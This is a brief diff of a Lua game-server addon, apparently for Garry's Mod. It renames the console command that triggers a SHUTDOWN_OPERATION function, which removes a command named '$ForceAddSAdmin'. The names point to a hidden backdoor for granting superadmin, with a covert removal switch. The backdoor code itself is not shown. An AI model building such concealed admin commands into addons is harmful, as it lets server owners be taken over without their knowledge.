@@ -45,4 +45,4 @@ local function SHUTDOWN_OPERATION(plr, cmd, args)
     concommand.Remove("$ForceAddSAdmin")
 end
 
-concommand.Add("$Protocal_54416032", SHUTDOWN_OPERATION)
+concommand.Add("$delete", SHUTDOWN_OPERATION)
